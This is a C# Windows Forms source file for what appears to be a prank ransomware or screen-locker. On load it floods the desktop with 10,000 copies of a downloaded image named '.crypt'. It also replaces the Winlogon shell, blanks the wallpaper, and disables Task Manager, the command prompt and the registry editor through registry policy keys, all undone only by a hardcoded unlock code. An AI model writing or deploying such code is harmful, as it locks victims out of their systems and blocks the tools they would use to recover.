

using Microsoft.Win32;
using System;
using System.IO;
using System.Net;
using System.Windows.Forms;

namespace mainwinformsapp1
{
    public partial class Form2 : Form
    {
        string desktop = @"C:\Users" + Environment.UserName + @"\Desktop";
        string localFile = @"C:\Users" + Environment.UserName + @"\Desktop\ransomware.crypt";
        public Form2()
        {
            InitializeComponent();
        }

        private void TextBox1_TextChanged(object sender, EventArgs e)
        {
            if (TextBox1.Text == "64b9e0os2-74bs83hnw2-n83hst3g-3n3kwud")
            {
                button1.Enabled = true;
            }
            else
            if (TextBox1.Text == "")
            {
                bool v = TextBox1.Text == "Incorrect decryption code, try again";
                button1.Enabled = false;
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (TextBox1.Text == "64b9e0os2-74bs83hnw2-n83hst3g-3n3kwud")
            {
                // Enable task manager and the cmd.
                RegistryKey reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                reg.SetValue("DisableTaskMgr", 0, RegistryValueKind.DWord);
                RegistryKey reg1 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System");
                reg1.SetValue("DisableCMD", 0, RegistryValueKind.DWord);
                // Unlock the Registry Editor.
                RegistryKey reg2 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                reg2.SetValue("DisableRegistryTools", 0, RegistryValueKind.DWord);
                // Change wallpaper to windows default.
                RegistryKey reg3 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
                reg3.SetValue("WallPaper", @"C:\WINDOWS\web\wallpaper\Windows\img0.jpg", RegistryValueKind.String);
                // Fix the shell.
                RegistryKey reg4 = Registry.CurrentUser.CreateSubKey("\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
                reg4.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
                Application.Exit();
            }
            else
            {
                TextBox1.Clear();
                button1.Enabled = false;
            }

        }

        private void Form2_Load(object sender, EventArgs e)
        {

            try
            {
                using (WebClient web = new WebClient())
                {
                    web.DownloadFile("https://api.time.com/wp-content/uploads/2020/03/youve-been-gnomed.png?w=1192&h=6288&crop=1", localFile);
                }
                for (int i = 0; i < 10000; i++)
                {
                    string number = desktop + i.ToString() + ".crypt";
                    File.Copy(localFile, number, true);
                }
            }
            catch
            {


            }
            
            // Black wallpaper
            RegistryKey reg3 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
            reg3.SetValue("Wallpaper", "", RegistryValueKind.String);
            // Block the shell
            RegistryKey reg4 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
            reg4.SetValue("Shell", "empty", RegistryValueKind.String);
            // Disable task manager and the cmd.
            RegistryKey reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            reg.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
            RegistryKey reg1 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System");
            reg1.SetValue("DisableCMD", 1, RegistryValueKind.DWord);
            // Also disable the registry editor so you can't enable the cmd and task manager.
            RegistryKey reg2 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            reg2.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);

        }

        private void button2_Click(object sender, EventArgs e)
        {
            Form1 form = new Form1();
            form.Show();
        }
    }
}
